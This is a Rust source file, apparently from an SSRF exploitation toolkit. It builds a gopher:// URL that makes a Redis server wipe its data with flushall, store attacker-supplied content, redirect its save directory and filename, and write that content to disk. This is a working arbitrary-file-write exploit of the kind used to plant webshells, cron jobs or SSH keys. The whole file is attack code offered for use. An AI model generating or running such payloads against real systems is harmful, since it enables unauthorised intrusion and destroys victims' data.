//! Redis exploit via Gopher protocol

use anyhow::Result;

use super::utils::replace_redis_payload;

/// Generate Gopher Redis write file exploit payload
pub fn gopher_redis_write_exp(addr: &str, path: &str, name: &str, data: &str) -> Result<String> {
    let commands = [
        // flushall
        "*1", "$8", "flushall", // set xxx <data>
        "*3", "$3", "set", "$3", "xxx",
    ];

    let mut payload_parts: Vec<String> = commands.iter().map(|s| s.to_string()).collect();

    // Add data with length
    payload_parts.push(format!("${}", data.len()));
    payload_parts.push(data.to_string());

    // config set dir <path>
    payload_parts.extend(vec![
        "*4".to_string(),
        "$6".to_string(),
        "config".to_string(),
        "$3".to_string(),
        "set".to_string(),
        "$3".to_string(),
        "dir".to_string(),
    ]);
    payload_parts.push(format!("${}", path.len()));
    payload_parts.push(path.to_string());

    // config set dbfilename <name>
    payload_parts.extend(vec![
        "*4".to_string(),
        "$6".to_string(),
        "config".to_string(),
        "$3".to_string(),
        "set".to_string(),
        "$10".to_string(),
        "dbfilename".to_string(),
    ]);
    payload_parts.push(format!("${}", name.len()));
    payload_parts.push(name.to_string());

    // save
    payload_parts.extend(vec!["*1".to_string(), "$4".to_string(), "save".to_string()]);

    // quit
    payload_parts.extend(vec!["*1".to_string(), "$4".to_string(), "quit".to_string()]);

    // Empty line at the end
    payload_parts.push(String::new());

    let payload = payload_parts.join("\r\n");
    let encoded = urlencoding::encode(&payload);
    let replaced = replace_redis_payload(&encoded);

    Ok(format!("gopher://{addr}/_{replaced}"))
}
